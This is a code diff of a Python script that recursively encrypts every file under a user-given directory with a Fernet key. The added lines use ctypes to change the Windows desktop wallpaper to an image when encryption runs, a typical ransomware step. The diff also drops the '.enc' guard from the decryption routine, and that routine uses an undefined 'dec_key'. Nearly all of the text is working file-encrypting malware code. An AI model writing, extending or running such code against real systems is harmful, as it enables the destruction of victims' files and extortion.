@@ -1,13 +1,22 @@
 import os
 from cryptography.fernet import Fernet
+import ctypes
 
 directory = input("파일의 경로를 입력하세요 :")
 case = int(input("encrypted(1) derypted(2) :"))
 
 filename = directory
 
+
 key = Fernet.generate_key()
 cipher = Fernet(key)
+
+imagePath = "C:\\Users\\s25ng\\encimg.jpg"
+
+def changeBG(imagePath):
+    SPI_SETDESKWALLPAPER = 20
+    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER,0,imagePath.encode(),0)
+    return;
 
 def encrypt_dir(directory):
     for root, dirs, files in os.walk(directory):
@@ -21,7 +30,7 @@ def decrypt_dir(directory):
             file_path = os.path.join(root, file_name)
             if file_path.endswith(".enc"):
                 decrypt_file(file_path)
-
+            
 def encrypt_file(file_path):
     with open(file_path, "rb") as file_in:
         encrypted_data = cipher.encrypt(file_in.read())
@@ -32,8 +41,6 @@ def encrypt_file(file_path):
     print(f"Encrypted {file_path}.")
 
 def decrypt_file(file_path):
-    if not file_path.endswith(".enc"):
-        return
     cipher = Fernet(dec_key)
     with open(file_path, "rb") as file_in:
         decrypted_data = cipher.decrypt(file_in.read())
@@ -45,6 +52,7 @@ def decrypt_file(file_path):
         os.rename(file_path, original_filename)
 
 if(case == 1):
+    changeBG(imagePath)
     print("Generated key:", key)
     encrypt_dir(directory)
 
